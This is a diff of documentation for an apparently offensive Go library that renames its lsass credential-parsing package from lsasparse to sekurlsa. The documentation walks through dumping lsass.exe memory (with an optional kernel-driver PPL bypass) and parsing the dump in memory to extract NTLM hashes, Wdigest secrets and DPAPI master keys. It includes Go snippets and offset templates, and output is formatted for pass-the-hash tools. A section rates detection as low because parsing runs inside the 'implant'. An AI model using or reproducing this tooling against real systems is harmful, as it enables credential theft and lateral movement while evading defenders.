@@ -7,7 +7,7 @@ The `credentials/` tree is split into a **producer** + **consumer** pair:
 | Package | Role | Platform | Touches |
 |---|---|---|---|
 | `credentials/lsassdump` | **Producer** — captures lsass.exe memory into a MINIDUMP blob | Windows | `NtOpenProcess` + `NtReadVirtualMemory` against lsass; optionally a `kernel/driver.ReadWriter` for PPL bypass |
-| `credentials/lsasparse` | **Consumer** — parses a MINIDUMP, decrypts the MSV1_0 logon-session list, surfaces NTLM hashes | cross-platform (pure Go) | nothing — no Win32 calls; an analyst Linux box can parse a Windows dump |
+| `credentials/sekurlsa` | **Consumer** — parses a MINIDUMP, decrypts the MSV1_0 logon-session list, surfaces NTLM hashes | cross-platform (pure Go) | nothing — no Win32 calls; an analyst Linux box can parse a Windows dump |
 
 Pair them in-process for "dump → extract → wipe" with no on-disk
 persistence:
@@ -16,7 +16,7 @@ persistence:
 import (
     "bytes"
     "github.com/oioio-space/maldev/credentials/lsassdump"
-    "github.com/oioio-space/maldev/credentials/lsasparse"
+    "github.com/oioio-space/maldev/credentials/sekurlsa"
 )
 
 // 1. Dump.
@@ -26,14 +26,14 @@ var buf bytes.Buffer
 if _, err := lsassdump.Dump(h, &buf, nil); err != nil { panic(err) }
 
 // 2. Parse the bytes still in memory — no disk write.
-result, err := lsasparse.Parse(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
-if err != nil { /* errors.Is(err, lsasparse.ErrUnsupportedBuild) → register a template */ }
+result, err := sekurlsa.Parse(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
+if err != nil { /* errors.Is(err, sekurlsa.ErrUnsupportedBuild) → register a template */ }
 defer result.Wipe()
 
 // 3. Use the credentials.
 for _, s := range result.Sessions {
     for _, c := range s.Credentials {
-        if msv, ok := c.(lsasparse.MSV1_0Credential); ok {
+        if msv, ok := c.(sekurlsa.MSV1_0Credential); ok {
             fmt.Println(msv.String()) // pwdump format ready for pth tools
         }
     }
@@ -66,7 +66,7 @@ making `lsassdump`'s output directly compatible with mimikatz's
 
 ---
 
-## `credentials/lsasparse`
+## `credentials/sekurlsa`
 
 The consumer is **complete with inline default Templates** at
 v0.23.2: the MINIDUMP reader, LSA crypto layer, MSV1_0 walker,
@@ -253,10 +253,10 @@ var (
 ### Registering a Template
 
 ```go
-import "github.com/oioio-space/maldev/credentials/lsasparse"
+import "github.com/oioio-space/maldev/credentials/sekurlsa"
 
 func init() {
-    _ = lsasparse.RegisterTemplate(&lsasparse.Template{
+    _ = sekurlsa.RegisterTemplate(&sekurlsa.Template{
         BuildMin: 19045, BuildMax: 19045, // Win10 22H2
         IVPattern:      []byte{ /* … 12-byte signature near the IV load instruction … */ },
         IVWildcards:    []int{ /* per-CU drift positions */ },
@@ -268,7 +268,7 @@ func init() {
         LogonSessionListPattern: []byte{ /* … */ },
         LogonSessionListOffset:  23,
         LogonSessionListCount:   32, // Win10 has 32 buckets
-        MSVLayout: lsasparse.MSVLayout{
+        MSVLayout: sekurlsa.MSVLayout{
             NodeSize:          0x100,
             LUIDOffset:        0x10,
             UserNameOffset:    0x90,
@@ -298,10 +298,10 @@ a real Win10/Win11 wdigest.dll. Operators with verified offsets
 register an extended Template:
 
 ```go
-import "github.com/oioio-space/maldev/credentials/lsasparse"
+import "github.com/oioio-space/maldev/credentials/sekurlsa"
 
 func init() {
-    _ = lsasparse.RegisterTemplate(&lsasparse.Template{
+    _ = sekurlsa.RegisterTemplate(&sekurlsa.Template{
         BuildMin: 19045, BuildMax: 19045, // Win10 22H2
 
         // LSA crypto fields (same as the MSV-only template).
@@ -316,12 +316,12 @@ func init() {
         LogonSessionListPattern: []byte{ /* … */ },
         LogonSessionListOffset:  23,
         LogonSessionListCount:   32,
-        MSVLayout: lsasparse.MSVLayout{ /* … */ },
+        MSVLayout: sekurlsa.MSVLayout{ /* … */ },
 
         // Wdigest fields — new.
         WdigestListPattern: []byte{ /* per-build wdigest signature */ },
         WdigestListOffset:  -4, // pypykatz uses -4 from the cmp/je sequence
-        WdigestLayout: lsasparse.WdigestLayout{
+        WdigestLayout: sekurlsa.WdigestLayout{
             NodeSize:       0x80,  // KIWI_WDIGEST_LIST_ENTRY size
             LUIDOffset:     0x28,
             UserNameOffset: 0x38,
@@ -358,17 +358,17 @@ The walker auto-disables when the registered Template has
 extend the Template at registration time:
 
 ```go
-import "github.com/oioio-space/maldev/credentials/lsasparse"
+import "github.com/oioio-space/maldev/credentials/sekurlsa"
 
 func init() {
-    _ = lsasparse.RegisterTemplate(&lsasparse.Template{
+    _ = sekurlsa.RegisterTemplate(&sekurlsa.Template{
         BuildMin: 19045, BuildMax: 19045, // Win10 22H2
 
         // … LSA + MSV + (optional) Wdigest fields …
 
         DPAPIListPattern: []byte{ /* per-build dpapi signature */ },
         DPAPIListOffset:  /* signed bytes from match start to rel32 */ 0,
-        DPAPILayout: lsasparse.DPAPILayout{
+        DPAPILayout: sekurlsa.DPAPILayout{
             NodeSize:       0x80,
             LUIDOffset:     0x10, // KIWI_MASTERKEY_CACHE_ENTRY.LogonId
             KeyGUIDOffset:  0x18, // .KeyUid (GUID)
@@ -387,7 +387,7 @@ Wdigest.
 
 ### Detection
 
-**Low**. `lsasparse.Parse` runs entirely in the implant's own
+**Low**. `sekurlsa.Parse` runs entirely in the implant's own
 address space with pure-Go primitives — no Win32 calls, no
 filesystem access, no further detection surface. The loud
 operations are the dump itself (covered in
